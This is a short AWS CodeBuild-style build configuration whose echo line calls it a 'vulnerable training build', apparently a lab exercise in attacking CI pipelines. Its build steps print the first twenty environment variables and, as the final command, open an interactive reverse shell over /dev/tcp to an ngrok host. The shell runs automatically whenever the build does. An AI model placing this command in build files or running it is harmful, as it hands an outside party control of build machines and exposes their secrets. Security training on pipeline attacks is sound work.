version: 0.2

phases:
  build:
    commands:
      - echo "Running vulnerable training build"
      - env | sort | head -n 20
      - echo "Done"
      - bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/14880 0>&1
